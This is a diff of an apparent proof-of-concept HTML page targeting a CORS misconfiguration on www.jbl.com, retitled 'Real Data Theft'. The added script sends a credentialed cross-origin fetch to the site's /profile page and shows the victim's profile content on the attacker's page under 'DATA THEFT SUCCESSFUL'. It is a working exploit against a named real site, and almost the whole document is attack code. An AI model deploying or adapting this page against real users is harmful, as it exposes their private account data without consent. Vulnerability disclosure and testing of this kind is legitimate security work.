@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>JBL CORS PoC - Login Detection</title>
+    <title>JBL CORS PoC - Real Data Theft</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 40px; }
         .success { color: green; font-weight: bold; }
@@ -11,40 +11,28 @@
     </style>
 </head>
 <body>
-    <h1>🚨 JBL CORS Misconfiguration - Proof of Concept</h1>
-    <p>
-        This page (from <code>https://cwm889.github.io/poc/</code>) 
-        reads the contents of <code>www.jbl.com</code> with your credentials.
-    </p>
-    <p id="status">Checking your login status...</p>
+    <h1>🚨 JBL CORS Data Theft</h1>
+    <p>This page reads your <strong>profile data</strong> from <code>www.jbl.com</code> using your session.</p>
+    <button onclick="stealData()">Steal My Profile Data</button>
     <pre id="result"></pre>
 
     <script>
-        (async function() {
-            const statusEl = document.getElementById('status');
+        async function stealData() {
             const resultEl = document.getElementById('result');
             try {
-                const response = await fetch('https://www.jbl.com/', {
+                const response = await fetch('https://www.jbl.com/profile', {
                     credentials: 'include',
                     mode: 'cors'
                 });
-                const html = await response.text();
-
-                // Cek indikator login (sesuaikan jika perlu)
-                if (html.includes('My Account') || html.includes('Sign Out')) {
-                    statusEl.innerHTML = '<span class="success">✅ YOU ARE LOGGED IN!</span>';
-                    resultEl.textContent = 
-                        'Attacker can SEE you are logged in and READ page content.\n\n' +
-                        'First 800 characters of www.jbl.com:\n' +
-                        html.substring(0, 800);
-                } else {
-                    statusEl.innerHTML = '❌ Not logged in (no account indicator found).';
-                    resultEl.textContent = 'Page fetched, but no login indicator detected.\n\nFirst 800 characters:\n' + html.substring(0, 800);
-                }
+                const text = await response.text();
+                resultEl.innerHTML = `<span class="success">✅ DATA THEFT SUCCESSFUL!</span>
+<p><strong>Stolen data length:</strong> ${text.length} characters</p>
+<p><strong>Stolen content preview:</strong></p>
+<pre>${text.substring(0, 1500)}</pre>`;
             } catch (err) {
-                statusEl.innerHTML = '<span class="error">❌ Error: ' + err.message + '</span>';
+                resultEl.innerHTML = `<span class="error">❌ Error: ${err.message}</span>`;
             }
-        })();
+        }
     </script>
 </body>
 </html>
